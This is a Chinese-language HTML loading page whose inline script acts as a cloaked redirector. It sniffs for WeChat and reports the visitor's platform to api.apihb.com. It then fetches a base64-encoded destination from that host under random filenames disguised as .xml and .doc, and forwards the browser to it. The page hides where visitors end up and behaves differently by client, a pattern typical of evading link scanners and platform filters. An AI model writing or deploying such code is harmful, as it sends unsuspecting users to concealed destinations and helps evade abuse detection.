<!DOCTYPE html>
<html lang="en">
<head>
    <title>加载中...</title>
    <style>
        html,body{ width:100%;height:100%;margin:0;padding:0;border:0 }
        .box{ position: fixed; top: 50%; left: 50%; transform: translate(-50%, -76%); background-color: rgba(0,0,0,0.5); border-radius: 8px; width: 120px; height: 120px; box-sizing: border-box; padding-top: 32px; }
        .box .icon{ margin: 0 auto 20px; display: block; animation: load 2s linear infinite; }
        .box .text{ font-size: 15px; color: rgba(255,255,255,0.8); font-family: "Helvetica Neue", Helvetica, sans-serif; text-align: center; }
        @keyframes load {
            0%{ transform: rotate(0deg); }
            100%{ transform: rotate(-360deg); }
        }
    </style>
</head>
<body>
    <div class="box">
        <svg t="1577083555796" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2823" width="30" height="30"><path d="M390.233825 229.124491c10.31186 18.557754 4.13193 42.325333-13.797053 53.068351-17.946947 10.760982-40.870175 4.419368-51.2-14.138386L238.574035 112.208842c-10.329825-18.557754-4.16786-42.325333 13.779088-53.068351 17.946947-10.760982 40.870175-4.419368 51.2 14.138386l86.698666 155.845614z" fill="#CDCDCD" p-id="2824"></path><path d="M785.461895 911.791158c10.31186 18.557754 4.13193 42.325333-13.797053 53.068351-17.946947 10.760982-40.870175 4.419368-51.2-14.138386l-86.698667-155.845614c-10.31186-18.557754-4.13193-42.325333 13.797053-53.068351 17.946947-10.760982 40.870175-4.419368 51.2 14.138386l86.698667 155.845614z" fill="#A9A9A9" p-id="2825"></path><path d="M794.875509 390.233825c-18.557754 10.31186-42.325333 4.13193-53.068351-13.797053-10.760982-17.946947-4.419368-40.870175 14.138386-51.2l155.845614-86.698667c18.557754-10.31186 42.325333-4.13193 53.068351 13.797053 10.760982 17.946947 4.419368 40.870175-14.138386 51.2l-155.845614 86.698667z" fill="#BBBBBB" p-id="2826"></path><path d="M112.208842 785.44393c-18.557754 10.329825-42.325333 4.16786-53.068351-13.779088-10.760982-17.946947-4.419368-40.870175 14.138386-51.2l155.845614-86.698667c18.557754-10.31186 42.325333-4.13193 53.068351 13.797053 10.760982 17.964912 4.419368 40.870175-14.138386 51.2L112.208842 785.425965z" fill="#999999" p-id="2827"></path><path d="M698.763228 268.054456c-10.329825 18.557754-33.253053 24.899368-51.2 14.138386-17.946947-10.743018-24.108912-34.492632-13.779088-53.068351l86.680702-155.845614c10.329825-18.557754 33.253053-24.899368 51.2-14.138386 17.946947 10.743018 24.108912 34.492632 13.779088 53.068351l-86.680702 155.845614z" fill="#C2C2C2" p-id="2828"></path><path d="M303.535158 950.721123c-10.329825 18.557754-33.253053 24.899368-51.2 14.156351-17.946947-10.778947-24.108912-34.528561-13.797053-53.086316l86.698667-155.845614c10.329825-18.557754 33.253053-24.899368 51.2-14.138386 17.946947 10.743018 24.108912 34.492632 13.797053 53.068351l-86.698667 155.845614z" fill="#9D9D9D" p-id="2829"></path><path d="M755.945544 698.763228c-18.557754-10.329825-24.899368-33.253053-14.138386-51.2 10.743018-17.946947 34.492632-24.108912 53.068351-13.779088l155.845614 86.680702c18.557754 10.329825 24.899368 33.253053 14.138386 51.2-10.743018 17.946947-34.492632 24.108912-53.068351 13.779088l-155.845614-86.680702z" fill="#AFAFAF" p-id="2830"></path><path d="M73.278877 303.535158c-18.557754-10.329825-24.899368-33.253053-14.138386-51.2 10.743018-17.946947 34.492632-24.108912 53.068351-13.797053l155.845614 86.698667c18.557754 10.329825 24.899368 33.253053 14.138386 51.2-10.743018 17.946947-34.492632 24.108912-53.068351 13.797053l-155.845614-86.698667z" fill="#D1D1D1" p-id="2831"></path><path d="M810.397193 556.912281C789.46807 556.912281 772.491228 536.791579 772.491228 512s16.976842-44.912281 37.905965-44.912281h175.696842c20.929123 0 37.905965 20.120702 37.905965 44.912281s-16.976842 44.912281-37.905965 44.912281h-175.696842z" fill="#B6B6B6" p-id="2832"></path><path d="M37.905965 556.912281C16.976842 556.912281 0 536.791579 0 512S16.976842 467.087719 37.905965 467.087719h175.696842c20.929123 0 37.905965 20.120702 37.905965 44.912281s-16.976842 44.912281-37.905965 44.912281H37.905965z" fill="#949494" p-id="2833"></path><path d="M467.087719 810.397193c0-20.929123 20.120702-37.905965 44.912281-37.905965s44.912281 16.976842 44.912281 37.905965v175.696842c0 20.929123-20.120702 37.905965-44.912281 37.905965s-44.912281-16.976842-44.912281-37.905965v-175.696842z" fill="#A3A3A3" p-id="2834"></path><path d="M467.087719 37.905965C467.087719 16.976842 487.208421 0 512 0S556.912281 16.976842 556.912281 37.905965v175.696842c0 20.929123-20.120702 37.905965-44.912281 37.905965s-44.912281-16.976842-44.912281-37.905965V37.905965z" fill="#C8C8C8" p-id="2835"></path></svg>
        <div class="text">加载中...</div>
    </div>
    <script>
        // 入口页代码
(function () {

    /**
     * 获取 `url?` 后面的参数
     * @param {string} name 获取指定`key`值
     * @returns {{}|string}
     */
    function getQueryParam(name = null) {
        const code = decodeURIComponent(location.search.slice(1));
        if (!code) return null;
        const param = JSON.parse(`{"${code.replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g, '":"')}"}`);
        if (name) {
            return param[name] || null;
        } else {
            return param
        }
    }

    /** 检测设备是否微信端 */
    function isWeChat() {
        const platform = navigator.platform;
        const win = platform.indexOf('Win') === 0;
        const mac = platform.indexOf('Mac') === 0;
        const ua = /micromessenger/.test(navigator.userAgent.toLowerCase())
        if (ua && !win && !mac) {
            return true;
        } else {
            return false;
        }
    }

    // /** 检测微信版本 */
    // function checkVersion() {
    //     const info = navigator.userAgent.toLowerCase();
    //     const key = /micromessenger/;
    //     let adopt = false;
    //     if (key.test(info)) {
    //         const index = info.search(key);
    //         let version = '';
    //         for (let i = index + 15; i < info.length; i++) {
    //             const item = info[i];
    //             if (/^\d{1,}$/.test(item) || item === '.') {
    //                 version += item;
    //             } else {
    //                 break;
    //             }
    //         }
    //         version = parseFloat(version);
    //         if (version >= 6.6) adopt = true;
    //     }
    //     return adopt;
    // }

    /** 上报数据 */
    function postInfo() {
        const XHR = new XMLHttpRequest();
        XHR.open('POST', `${webUrl}/${randomString}.xml`, true);
        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        XHR.send(`platform=${navigator.platform}`);
    }

    /**
     * 跳转
     * @param {string} url
     */
    function openLink(url) {
        location.href = url;
        // const label = document.createElement('a');
        // label.setAttribute('rel', 'noreferrer');
        // label.setAttribute('href', url);
        // document.body.appendChild(label);
        // label.click();
    }

    /** 跳转落地 */
    function start() {
        const queryParam = getQueryParam('type');
        let addParam = '';
        if (queryParam) {
            addParam = `?type=${queryParam}`;
        }
        // console.log(addParam);
        fetch(`${webUrl}/${randomString}.doc${addParam}`).then(response => response.text()).then(res => openLink(atob(res)));
    }

    /**
     * 请求接口域名
     * @description
     * 旧版地址：'https://api.apihb.com';
     */
    const webUrl = 'https://api.apihb.com';

    const randomString = Math.random().toString(36).substr(2);

    // !isWeChat() || !checkVersion()
    if (!isWeChat()) {
        postInfo();
        start();
        //location.replace('https://www.baidu.com/');
    } else {
        start();
    }

})();
    </script>
</body>
</html>